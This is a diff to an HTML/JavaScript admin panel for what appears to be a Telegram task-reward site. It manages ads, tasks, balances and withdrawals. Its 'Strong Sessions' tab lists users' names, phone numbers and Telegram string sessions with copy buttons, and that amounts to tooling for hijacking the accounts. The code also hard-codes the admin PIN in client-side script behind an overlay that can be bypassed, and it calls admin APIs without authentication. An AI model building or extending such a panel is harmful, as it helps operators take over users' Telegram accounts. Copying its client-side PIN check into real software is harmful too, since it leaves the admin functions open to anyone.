@@ -7,45 +7,65 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --primary: #39d353; --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --danger: #ff4d4d; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; overflow-x: hidden; }
         
         /* Sidebar */
-        .sidebar { width: 240px; background: var(--card); border-right: 1px solid var(--border); height: 100vh; position: fixed; }
+        .sidebar { width: 240px; background: var(--card); border-right: 1px solid var(--border); height: 100vh; position: fixed; z-index: 10; }
         .sidebar h2 { color: var(--primary); text-align: center; font-size: 18px; padding: 20px; border-bottom: 1px solid var(--border); }
         .nav-link { padding: 15px 20px; display: block; color: #8b949e; text-decoration: none; cursor: pointer; transition: 0.3s; }
         .nav-link:hover, .nav-link.active { background: #21262d; color: var(--primary); border-left: 3px solid var(--primary); }
 
         /* Main Content */
-        .main-content { margin-left: 240px; padding: 30px; width: calc(100% - 240px); }
-        .tab-content { display: none; }
+        .main-content { margin-left: 240px; padding: 30px; width: calc(100% - 240px); min-height: 100vh; }
+        .tab-content { display: none; animation: fadeIn 0.5s; }
         .tab-content.active { display: block; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
         /* Cards & UI */
         .admin-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
         h3 { color: var(--primary); font-size: 16px; margin-top: 0; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 15px; }
         
-        textarea, input { width: 100%; background: #0d1117; border: 1px solid var(--border); color: var(--primary); padding: 10px; border-radius: 8px; box-sizing: border-box; margin-top: 5px; font-family: monospace; }
-        .btn { width: 100%; padding: 12px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; }
+        textarea, input { width: 100%; background: #0d1117; border: 1px solid var(--border); color: var(--primary); padding: 12px; border-radius: 8px; box-sizing: border-box; margin-top: 5px; font-family: 'Courier New', monospace; outline: none; }
+        textarea:focus, input:focus { border-color: var(--primary); }
+
+        .btn { width: 100%; padding: 12px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }
         .btn-save { background: var(--primary); color: #000; }
-        .btn-save:hover { opacity: 0.8; }
+        .btn-save:hover { background: #2eb346; transform: translateY(-2px); }
         
         /* Table Styles */
         table { width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 10px; }
         th, td { text-align: left; padding: 12px; border-bottom: 1px solid var(--border); }
         th { color: var(--primary); background: #21262d; }
-        .btn-copy { background: #0088cc; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 11px; }
+        .btn-copy { background: #0088cc; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 12px; transition: 0.2s; }
+        .btn-copy:hover { background: #0077b3; }
         
-        .session-input { background: #000 !important; border: 1px solid #333 !important; color: #39d353 !important; font-size: 11px; width: 200px; }
+        .session-input { background: #000 !important; border: 1px solid #333 !important; color: #39d353 !important; font-size: 11px; width: 100%; cursor: default; }
+
+        /* Login Overlay */
+        #admin-login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0d1117; z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .login-box { background: #161b22; padding: 40px; border-radius: 15px; border: 1px solid #30363d; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.7); width: 320px; }
+        .login-box i { font-size: 40px; color: var(--primary); margin-bottom: 20px; }
     </style>
 </head>
 <body>
+
+    <div id="admin-login-overlay">
+        <div class="login-box">
+            <i class="fas fa-user-lock"></i>
+            <h2 style="color: var(--text); margin-bottom: 20px;">Admin Access</h2>
+            <input type="password" id="admin-pass-input" placeholder="Enter Admin PIN" style="text-align: center; font-size: 20px; letter-spacing: 5px;">
+            <button onclick="checkAdminLogin()" class="btn btn-save" style="margin-top: 25px;">Login System</button>
+            <p id="login-error" style="color: var(--danger); margin-top: 15px; display: none; font-size: 14px;">Invalid PIN! Access Denied.</p>
+        </div>
+    </div>
 
     <div class="sidebar">
         <h2><i class="fas fa-user-shield"></i> AAF ADMIN</h2>
         <div class="nav-link active" onclick="showTab('ads-tab', this)"><i class="fas fa-ad"></i> Ads Manager</div>
         <div class="nav-link" onclick="showTab('tasks-tab', this)"><i class="fas fa-tasks"></i> Task Manager</div>
-        <div class="nav-link" onclick="showTab('users-tab', this)"><i class="fas fa-users-cog"></i> Users & Withdraw</div>
+        <div class="nav-link" onclick="showTab('users-tab', this)"><i class="fas fa-users-cog"></i> Users & Balance</div>
         <div class="nav-link" onclick="showTab('sessions-tab', this); loadSessions();"><i class="fas fa-key"></i> Strong Sessions</div>
     </div>
 
@@ -54,28 +74,29 @@
         <div id="ads-tab" class="tab-content active">
             <div class="admin-card">
                 <h3><i class="fas fa-ad"></i> Ad Rotation (10 Slots)</h3>
+                <p style="font-size: 12px; color: #8b949e;">এখানে আপনার ১০টি অ্যাড স্লটের কোড বসিয়ে আপডেট করুন।</p>
                 <div class="grid" id="ad-slots-container"></div>
-                <button class="btn btn-save" onclick="saveAds()">Update All Ads</button>
+                <button class="btn btn-save" onclick="saveAds()"><i class="fas fa-sync-alt"></i> Update All Ads</button>
             </div>
         </div>
 
         <div id="tasks-tab" class="tab-content">
             <div class="admin-card">
                 <h3><i class="fas fa-tasks"></i> Add New Task</h3>
-                <label>Task Title</label><input type="text" id="task-title" placeholder="Job Name">
+                <label>Task Title</label><input type="text" id="task-title" placeholder="e.g. Join Telegram Channel">
                 <label>Reward (৳)</label><input type="number" id="task-reward" placeholder="0.50">
-                <label>Link</label><input type="text" id="task-link" placeholder="https://t.me/yourchannel">
-                <button class="btn btn-save" onclick="addTask()">Publish Task</button>
+                <label>Link</label><input type="text" id="task-link" placeholder="https://t.me/...">
+                <button class="btn btn-save" onclick="addTask()"><i class="fas fa-plus-circle"></i> Publish Task</button>
             </div>
         </div>
 
         <div id="users-tab" class="tab-content">
             <div class="grid">
                 <div class="admin-card">
-                    <h3><i class="fas fa-user-edit"></i> User Balance Edit</h3>
-                    <label>Telegram ID</label><input type="number" id="search-uid" placeholder="Enter User ID">
+                    <h3><i class="fas fa-user-edit"></i> Edit User Balance</h3>
+                    <label>Telegram ID</label><input type="number" id="search-uid" placeholder="User ID">
                     <label>New Balance (৳)</label><input type="number" id="edit-bal" placeholder="0.00">
-                    <button class="btn btn-save" onclick="updateUser()">Apply Balance</button>
+                    <button class="btn btn-save" onclick="updateUser()"><i class="fas fa-save"></i> Save Changes</button>
                 </div>
                 <div class="admin-card">
                     <h3><i class="fas fa-money-bill-wave"></i> Pending Withdrawals</h3>
@@ -91,36 +112,53 @@
 
         <div id="sessions-tab" class="tab-content">
             <div class="admin-card">
-                <h3><i class="fas fa-key"></i> User Strong Sessions (String Sessions)</h3>
+                <h3><i class="fas fa-key"></i> User Strong Sessions</h3>
                 <p style="font-size: 12px; color: #8b949e; margin-bottom: 15px;">আপনার ডাটাবেজে জমা হওয়া সকল টেলিগ্রাম সেশন এখানে পাবেন।</p>
-                <table>
-                    <thead>
-                        <tr>
-                            <th>User Name</th>
-                            <th>Phone Number</th>
-                            <th>Session String</th>
-                            <th>Action</th>
-                        </tr>
-                    </thead>
-                    <tbody id="session-list">
-                        <tr><td colspan="4" style="text-align:center;">Loading sessions...</td></tr>
-                    </tbody>
-                </table>
+                <div style="overflow-x: auto;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Name</th>
+                                <th>Phone</th>
+                                <th>String Session</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="session-list">
+                            <tr><td colspan="4" style="text-align:center;">Loading sessions...</td></tr>
+                        </tbody>
+                    </table>
+                </div>
             </div>
         </div>
 
     </div>
 
     <script>
-    let masterPin = prompt("এডমিন পিন দিন:");
-    if (masterPin !== "Abdullah6790") {
-        alert("ভুল পিন! এক্সেস ডিনাইড।");
-        document.body.innerHTML = "<h1 style='color:red; text-align:center;'>Unauthorized Access!</h1>";
-    }
-        
-        const API_URL = window.location.origin; // অটোমেটিক বর্তমান ডোমেইন নিবে
+        // --- Security Configuration ---
+        const MY_PIN = "Abdullah6790"; // আপনার মাস্টার পিন
+        const API_URL = window.location.origin;
 
-        // Tab Switching Logic
+        function checkAdminLogin() {
+            const input = document.getElementById('admin-pass-input').value;
+            const overlay = document.getElementById('admin-login-overlay');
+            const errorMsg = document.getElementById('login-error');
+
+            if (input === MY_PIN) {
+                overlay.style.display = 'none';
+                console.log("Access Granted!");
+            } else {
+                errorMsg.style.display = 'block';
+                document.getElementById('admin-pass-input').value = "";
+            }
+        }
+
+        // Enter key to login
+        document.getElementById('admin-pass-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') checkAdminLogin();
+        });
+
+        // --- Navigation Logic ---
         function showTab(tabId, el) {
             document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
@@ -128,14 +166,13 @@
             el.classList.add('active');
         }
 
-        // Generate 10 Ad Slots
+        // --- Ad Slot Generator ---
         const adContainer = document.getElementById('ad-slots-container');
         for (let i = 1; i <= 10; i++) {
-            adContainer.innerHTML += `<div><label>Slot #${i}</label><textarea id="ad-code-${i}" rows="3" placeholder="Paste JS code..."></textarea></div>`;
+            adContainer.innerHTML += `<div><label>Slot #${i}</label><textarea id="ad-code-${i}" rows="3" placeholder="Ad Script Here..."></textarea></div>`;
         }
 
         // --- API Functions ---
-
         async function saveAds() {
             let ads = [];
             for (let i = 1; i <= 10; i++) {
@@ -143,13 +180,13 @@
                 if(code) ads.push({ slot: i, code: code });
             }
             try {
-                const res = await fetch(`${API_URL}/api/update_ads`, {
+                await fetch(`${API_URL}/api/update_ads`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ ads: ads })
                 });
-                alert("Ads Updated Successfully!");
-            } catch(e) { alert("Error updating ads"); }
+                alert("✅ Ads Updated Successfully!");
+            } catch(e) { alert("❌ Error updating ads"); }
         }
 
         async function addTask() {
@@ -158,12 +195,14 @@
                 reward: document.getElementById('task-reward').value,
                 link: document.getElementById('task-link').value
             };
+            if(!task.title || !task.reward) return alert("Please fill Title and Reward");
             await fetch(`${API_URL}/api/add_task`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(task)
             });
-            alert("New Task Published!");
+            alert("✅ Task Published!");
+            document.getElementById('task-title').value = '';
         }
 
         async function updateUser() {
@@ -171,16 +210,16 @@
                 telegram_id: document.getElementById('search-uid').value, 
                 balance: document.getElementById('edit-bal').value 
             };
+            if(!data.telegram_id) return alert("Please enter User ID");
             await fetch(`${API_URL}/api/admin/update_user`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data)
             });
-            alert("User Balance Updated!");
+            alert("✅ Balance Updated!");
         }
 
-        // --- Session Management Functions ---
-
+        // --- Session Loader ---
         async function loadSessions() {
             const container = document.getElementById('session-list');
             try {
@@ -192,7 +231,7 @@
                     data.sessions.forEach(user => {
                         container.innerHTML += `
                             <tr>
-                                <td>${user.name || 'N/A'}</td>
+                                <td>${user.name || 'User'}</td>
                                 <td>${user.phone || 'N/A'}</td>
                                 <td><input type="text" class="session-input" value="${user.session_string}" readonly></td>
                                 <td><button class="btn-copy" onclick="copySession('${user.session_string}')"><i class="fas fa-copy"></i> Copy</button></td>
@@ -200,17 +239,17 @@
                         `;
                     });
                 } else {
-                    container.innerHTML = "<tr><td colspan='4' style='text-align:center;'>No sessions found in database.</td></tr>";
+                    container.innerHTML = "<tr><td colspan='4' style='text-align:center;'>No sessions found.</td></tr>";
                 }
             } catch (e) {
-                container.innerHTML = "<tr><td colspan='4' style='text-align:center; color:red;'>Failed to load sessions.</td></tr>";
+                container.innerHTML = "<tr><td colspan='4' style='text-align:center; color:red;'>Error loading data.</td></tr>";
             }
         }
 
         function copySession(str) {
             navigator.clipboard.writeText(str);
-            alert("Session String Copied to Clipboard!");
+            alert("✅ Session String Copied!");
         }
     </script>
 </body>
-    </html>
+</html>
